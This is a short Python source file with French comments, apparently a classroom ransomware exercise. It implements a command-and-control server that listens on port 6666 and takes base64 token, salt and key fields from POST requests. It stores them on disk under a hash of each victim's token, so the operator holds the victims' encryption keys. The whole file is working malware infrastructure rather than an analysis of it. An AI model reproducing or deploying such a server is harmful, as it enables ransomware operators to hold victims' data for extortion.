import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data) #décodage des données 
        path = os.path.join(CNC.ROOT_PATH, token, filename) #chemin pour enregistrer le fichier 
        os.makedirs(os.path.dirname(path), exist_ok=True)#création du repertoire si besoin
        with open(path, "wb") as f: #ecriture des données dans le fichier
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        #on extrait les données qui sont en base 64
        token_b64 = body.get("token")
        salt_b64 = body.get("salt")
        key_b64 = body.get("key")
        
        if not all([token_b64, salt_b64, key_b64]): # On vérifie si on a tous les élements et si rien ne manque
            return {"status": "Not OK", "error": "Elements are missing in the body"}
            
        token_hash = sha256(base64.b64decode(token_b64)).hexdigest()#On crée ici un nom de fichier en hachant le #token on doit convertir les données base 64 données binaires si non le sha256 ne fonctionne pas, une fois le hachage fait hexdigest converit le tout en une représentation hexa sous forme de chaine de caractères
        self.save_b64(token_hash, salt_b64, "salt.bin")#stockage du salt et de la clé dans le repertoire qui sera crée
        self.save_b64(token_hash, key_b64, "key.bin")#dans la fonction save
        
        print(f"Éléments enregistrés avec succès dans {token_hash}")
        
        return {"status": "OK"}

# Lancement du serveur HTTP           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()
